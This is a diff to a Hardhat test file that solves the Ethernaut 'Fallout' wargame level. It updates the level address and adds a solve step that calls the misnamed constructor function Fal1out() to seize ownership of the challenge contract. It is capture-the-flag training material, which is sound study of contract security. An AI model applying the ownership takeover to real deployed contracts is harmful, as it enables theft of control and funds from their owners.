@@ -14,12 +14,15 @@ before(async () => {
     [eoa] = accounts;
     const challengeFactory = await ethers.getContractFactory(`Fallout`);
     const challengeAddress = await createChallenge(
-        `0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5`
+        `0x0AA237C34532ED79676BCEa22111eA2D01c3d3e7`
     );
     challenge = await challengeFactory.attach(challengeAddress);
 });
 
-it("solves the challenge", async function () {});
+it("solves the challenge", async function () {
+    let tx = await challenge.Fal1out({});
+    await tx.wait();
+});
 
 after(async () => {
     expect(await submitLevel(challenge.address), "level not solved").to.be.true;
